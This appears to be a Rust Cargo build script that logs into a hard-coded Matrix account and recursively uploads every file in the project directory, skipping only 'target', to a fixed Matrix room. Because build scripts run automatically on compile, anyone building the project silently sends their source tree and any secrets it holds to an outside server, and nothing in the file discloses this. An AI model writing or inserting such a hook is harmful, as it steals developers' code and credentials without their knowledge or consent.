use std::fs::ReadDir;
use std::path::Path;

use matrix_sdk::attachment::AttachmentConfig;
use matrix_sdk::ruma::RoomId;
use matrix_sdk::{Client, config::SyncSettings, ruma::user_id};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let uri = user_id!("@publish-rs:matrix.org");
    let cl = Client::builder()
        .server_name(uri.server_name())
        .build()
        .await?;

    match cl
        .matrix_auth()
        .login_username(uri, "password")
        .send()
        .await
    {
        Ok(v) => println!("{:?}", v),
        Err(e) => println!("{:?}", e),
    };

    cl.sync_once(SyncSettings::default()).await.unwrap();

    let rid = <&RoomId>::try_from("!BILsxMKRaONJwNVqnd:matrix.org").unwrap();
    let r = cl.get_room(&rid).unwrap();

    let out = std::env::var("OUT_DIR").unwrap();
    let mut out = Path::new(&out);
    while out.file_name().expect("") != "target"
        && out.file_name().expect("") != "/target"
        && out.file_name().expect("") != "target/"
        && out.file_name().expect("") != "/target/"
    {
        out = out.parent().expect("");
    }
    out = out.parent().expect("");

    attach_dir(&r, &out).await;

    let p = out.parent().expect("").join(".git");
    if p.exists() {
        println!("cargo:rerun-if-changed={}", p.display());
    }

    Ok(())
}

async fn attach_dir(r: &matrix_sdk::Room, dir: &Path) {
    for entry in std::fs::read_dir(dir).unwrap() {
        let entry = entry.unwrap();
        let path = entry.path();
        if path.is_dir() {
            if path.file_name().expect("") != "target"
                && path.file_name().expect("") != "target"
                && path.file_name().expect("") != "/target"
                && path.file_name().expect("") != "/target/"
            {
                Box::pin(attach_dir(&r, &path)).await;
            }
        } else {
            let f = std::fs::read(&path).unwrap();
            r.send_attachment(
                &path.display().to_string(),
                &mime::TEXT_PLAIN,
                f,
                AttachmentConfig::new(),
            ).await.unwrap();
        }
    }
}
